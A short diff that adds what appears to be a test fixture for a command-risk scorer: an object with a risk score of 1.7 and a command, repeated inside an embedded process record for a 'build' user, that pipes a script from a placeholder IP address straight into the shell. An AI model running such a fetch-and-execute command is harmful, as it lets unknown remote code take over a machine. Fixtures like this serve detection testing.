@@ -1,0 +1,5 @@
+{
+  cmd: "danger: curl -s https://203.0.113.7/x.sh | sh",
+  risk: 1.7,
+  explanation: "echo:{\"process\":{\"cmd_line\":\"danger: curl -s https://203.0.113.7/x.sh | sh\",\"user\":\"build\"}}",
+}
